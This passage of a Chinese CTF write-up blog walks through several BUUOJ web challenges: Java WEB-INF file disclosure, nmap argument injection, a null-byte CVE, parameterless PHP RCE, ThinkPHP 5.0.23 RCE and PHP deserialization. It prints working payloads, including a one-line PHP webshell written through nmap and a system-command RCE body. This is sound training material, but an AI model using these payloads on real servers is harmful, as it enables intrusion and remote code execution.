src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483" loading="lazy"><p>打开为登陆界面，SQL注入无果，点<code>help</code>，发现url变化为<code>./Download?filename=help.docx</code></p><p>猜测源码泄露，尝试伪协议读取源码<code>php://filter/convert.base64-encode/resource=help.docx</code>发现报错为<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p><p>结合题目名，猜测JAVA-WEB应用</p><p>报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参<code>filename=WEB-INF/web.xml</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236" loading="lazy"><p>尝试请求<code>/Flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678" loading="lazy"><p> 结合tomcat的项目存放路径经验试试下载FlagController.class </p><p>传参<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946" loading="lazy"><p>直接访问下载也行，抓包请求也行，base64解码一下发现flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474" loading="lazy"><hr><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmap工具的利用</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>考两个函数<code>escapeshellarg</code></p><p> <strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p><p><code>escapeshellarg</code></p><p> <strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p><p>然而之前就爆出了漏洞… 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 </p><p>如</p><p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p><p>相当于<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p><p>字符转义了</p><p>查阅nmap帮助手册<code>nmap -h</code></p><p>首先想读取文件，利用<code>-iL</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868" loading="lazy"><p>发现不行，cmd可以，但执行后没有回显，以下为本地环境</p><img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276" loading="lazy"><p>关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。</p><p>利用<code>-oG</code>参数</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935" loading="lazy"><p>直接写一句话木马就好了</p><p>payload=<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p><p>最后和单引号要有空格，因为让system执行时最后的参数是<code>shell.php</code>而不是<code>shell.php\&#39;</code>，因为 <strong>escapeshellarg()**和</strong>escapeshellcmd()** 有转义，单引号是因为函数会检查字符串匹配引号的情况</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462" loading="lazy"><p>查看文件</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924" loading="lazy"><p>拿到shell</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957" loading="lazy"><p>本地文件是这样的，可以看到包含了一句话木马</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711" loading="lazy"><hr><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> <strong>将get_headers（）与用户提供的URL一起使用时</strong>，如果URL包含零（\ 0）字符，则URL将被静默地<strong>截断</strong>。<strong>这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</strong> </p><p>题目讲明为CVE，排除SSRF</p><p>在响应头中发现hint</p><img src="/article/Buuoj-WEB-Write-up/image-20201208195802041.png" class="" title="image-20201208195802041" loading="lazy"><p>访问<code>./?url=http://localhost%00www.ctfhub.com</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208195922474.png" class="" title="image-20201208195922474" loading="lazy"><p><code>Tips: Host must be end with &#39;123&#39;</code></p><p>访问<code>./?url=http://127.0.0.123%00www.ctfhub.com</code>即可</p><img src="/article/Buuoj-WEB-Write-up/image-20201208200037696.png" class="" title="image-20201208200037696" loading="lazy"><p>主要考一个CVE，记录一下</p><hr><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露</p><p>一点提示都没有！可恶</p><p><code>robots.txt</code>没有，响应头没有，随手访问了个<code>./.git/</code>结果真有，直接上GitHack</p><img src="/article/Buuoj-WEB-Write-up/image-20201208202421537.png" class="" title="image-20201208202421537" loading="lazy"><p>强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？</p><img src="/article/Buuoj-WEB-Write-up/image-20201208203755631.png" class="" title="image-20201208203755631" loading="lazy"><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>很好，看到这个<code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]</code>妥妥的无参数RCE</p><p>过滤一堆</p><p>先扫当前目录</p><p>payload=<code>./?exp=print_r(scandir(current(localeconv())));</code></p><pre class="language-shell" data-language="shell"><code class="language-shell">localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span>: 返回一包含本地数字及货币格式信息的数组。如下图current<span class="token punctuation">(</span><span class="token punctuation">)</span>: 取数组中第一个元素，返回数组中的当前单元。current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span>: 取符号.scandir<span class="token punctuation">(</span><span class="token punctuation">)</span>: 扫描目录scandir<span class="token punctuation">(</span>current<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>： 等同于scandir<span class="token punctuation">(</span>.<span class="token punctuation">)</span>，即扫描当前目录print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>： 输出</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208205457822.png" class="" title="image-20201208205457822" loading="lazy"><p>localeconv()如图所示</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205704606.png" class="" title="image-20201208205704606" loading="lazy"><p>current(localeconv())取到了符号.</p><img src="/article/Buuoj-WEB-Write-up/image-20201208205956327.png" class="" title="image-20201208205956327" loading="lazy"><p>发现了flag.php</p><p>下面要取flag.php中的内容，flag.php在倒数第二组</p><p>由于没有禁用session，利用session<del>（我最喜欢</del></p><img src="/article/Buuoj-WEB-Write-up/image-20201208210427209.png" class="" title="~" loading="lazy"><p>其他方法</p><p>payload=<code>./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></p><pre class="language-none"><code class="language-none">array_flip()： 交换数组的键和值array_rand()： 从数组中随机取出一个或多个单元readfile()： 读文件</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208211502701.png" class="" title="image-20201208211502701" loading="lazy"><p>有点小运气嗷，可以写脚本跑，反正随机嘛…概率问题</p><p>读源码方法</p><pre class="language-none"><code class="language-none">file_get_contents()： 本题被banview-source:highlight_file()show_source()readfile()</code></pre><hr><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><h5 id="thinkphp5-0-23-远程代码执行-漏洞"><a href="#thinkphp5-0-23-远程代码执行-漏洞" class="headerlink" title="thinkphp5.0.23 远程代码执行 漏洞"></a>thinkphp5.0.23 远程代码执行 漏洞</h5><p>payload：</p><p>POST</p><pre class="language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</code></pre><hr><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><img src="/article/Buuoj-WEB-Write-up/image-20201210190510038.png" class="" title="image-20201210190510038" loading="lazy"><p>打开一会发现网页自动刷新了，抓包看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201210190602388.png" class="" title="image-20201210190602388" loading="lazy"><p>自动刷新</p><pre class="language-none"><code class="language-none">setTimeout(&quot;document.form1.submit()&quot;,5000)</code></pre><p>怀疑调用函数，尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;file_get_contents&amp;p&#x3D;index.php</code></pre><p>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"touch"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"substr_replace"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_filter"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"array_map"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"filter_var"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uasort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uksort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_reduce"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwrite"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>分析发现禁用了不少函数，调用了<code>call_user_func()</code>函数，可能存在命令执行。</p><p><code>gettype()</code>函数限制执行后返回必须为String类型。</p><p>观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用<code>gettime()</code>函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。</p><p>尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044" loading="lazy"><p>再扫根目录文件</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277" loading="lazy"><p>根目录没发现flag，利用system来找一下，<code>find / -name fla*</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790" loading="lazy"><p>发现了奇怪的东西，打开即为flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><hr><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>考验http请求头，打开随便登陆底部源码提示<code>&lt;!-- L0g1n.php --&gt;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424" loading="lazy"><ol><li>提示<code>Sorry, this site will be available after totally 99 years!</code></li></ol><p>修改Cookie中<code>time=9999999999</code></p><ol start="2"><li>提示<code>Sorry, this site is only optimized for those who comes from localhost</code></li></ol><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>提示<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive·</code></p><p>添加<code>Client-IP: 127.0.0.1</code></p><ol start="3"><li>提示<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li></ol><p>添加<code>Referer: gem-love.com</code></p><ol start="4"><li>提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li></ol><p>资料：科摩多64位安全浏览器的UA为 Commodore 64 </p><p>修改<code>User-Agent: Commodore 64</code></p><ol start="5"><li>提示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li></ol><p>添加<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p><ol start="6"><li>提示<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></li></ol><p>添加<code>Via: y1ng.vip</code></p><p>提示</p><pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--&#123;一段base64编码&#125;--&gt;</code></pre><p>base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧…</p><p>最终payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>Connection<span class="token punctuation">:</span> close<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comFrom<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token punctuation">.</span>comVia<span class="token punctuation">:</span> y1ng<span class="token punctuation">.</span>vip</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865" loading="lazy"><hr><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657" loading="lazy"><p>ID测试，不是SQL注入，测试<code>&#123;&#123;1+1&#125;&#125;</code></p><p>返回<code>2</code>，确认SSTI</p><img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456" 